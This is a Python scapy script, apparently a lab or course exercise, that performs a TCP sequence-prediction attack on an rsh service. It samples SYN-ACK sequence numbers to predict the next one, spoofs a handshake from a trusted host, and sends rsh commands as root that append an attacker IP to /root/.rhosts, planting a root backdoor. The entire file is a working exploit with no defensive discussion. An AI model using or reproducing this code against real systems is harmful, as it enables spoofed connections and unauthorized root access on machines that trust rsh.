from scapy.all import *

import sys
import re
from statistics import mode

nexseq = 100

#find gap in subsequent SEQ values
def detective(src):
	previous = 0
	seqs = []
	for i in range(20):
		ip = IP()
		ip.dst = src
		tcp = TCP()
		tcp.dport = 513
		tcp.flags = "S"
		resp = sr1(ip/tcp, verbose=0)
		if(i!=0):
			seqs.append(resp[TCP].seq - previous)
		previous = resp[TCP].seq
	return mode(seqs)

#get next ack value
def getNext(val, seq_gap):
	ip = IP(dst=val)
	tcp = TCP(dport=514, sport=514, flags="S")
	resp = sr1(ip/tcp, verbose=0)
	print("#Received SEQ %d" % resp[TCP].seq)
	return resp[TCP].seq + 1 + seq_gap

#spoof three-way handshake between src and dest with precalculated ack value
def spoof(src, dest, ack):
	global nexseq
	#create and send SYN
	ip = IP(src=src, dst=dest)
	tcp = TCP(sport=711, dport=514, seq=nexseq, flags="S")
	pkt = (ip/tcp)
	send(pkt, verbose=0)
	nexseq += 1
	time.sleep(2) #wait before sending next packet
	#create and send ACK
	tcp = TCP(sport=711, dport=514, ack=ack, seq=nexseq, flags="A")
	pkt = (ip/tcp)
	send(pkt, verbose=0)
	time.sleep(2)

def sendPL(src, dest, ack, payload):
	global nexseq
	ip = IP(src=src, dst=dest)
	tcp = TCP(sport=711, dport=514, seq=nexseq, ack=ack, flags="PA")
	pkt = ip/tcp/payload
	send(pkt, verbose=0)
	nexseq += len(payload)
	time.sleep(2)

if __name__ == "__main__":
	conf.iface = sys.argv[1]
	target_ip = sys.argv[2]
	trusted_host_ip = sys.argv[3]

	my_ip = get_if_addr(sys.argv[1])

	#TODO: figure out SYN sequence number pattern
	print("#finding seq gap")
	seq_gap = detective(target_ip)
	print("#",seq_gap)
	print("#getting next ack")
	predicted = getNext(target_ip, seq_gap)

	#TODO: TCP hijacking with predicted sequence number
	#SPOOOOOOOOOOOOOF
	print("#spoofing connection with target")
	spoof(trusted_host_ip, target_ip, predicted)
	#send payload for access
	print("#sending payloads")
	#cite: https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/r_commands/rshd.html
	sendPL(trusted_host_ip, target_ip, predicted, "\0")
	sendPL(trusted_host_ip, target_ip, predicted, "root\0")
	sendPL(trusted_host_ip, target_ip, predicted, "root\0")
	sendPL(trusted_host_ip, target_ip, predicted, "echo '10.4.22.77 root' >> /root/.rhosts\0")
